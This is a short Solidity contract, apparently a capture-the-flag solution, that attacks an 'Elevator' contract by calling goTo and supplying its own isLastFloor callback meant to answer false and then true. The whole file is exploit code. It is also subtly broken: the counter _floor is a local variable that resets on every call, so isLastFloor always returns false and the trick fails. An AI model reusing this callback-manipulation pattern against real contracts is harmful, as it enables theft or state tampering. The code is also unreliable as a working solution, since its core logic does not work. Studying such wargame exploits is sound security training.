pragma solidity ^0.6.0;
import "./11-Elevator.sol";

contract ElevatorAttack {
    Elevator elevatorContract;

    constructor(address elevatorContractAddress) public {
        elevatorContract = Elevator(elevatorContractAddress);
    }

    function attack() public {
        elevatorContract.goTo(0);
    }

    function isLastFloor(uint256) external returns (bool) {
        uint256 _floor;
        _floor++;
        if (_floor > 1) return true;
        else return false;
    }
}
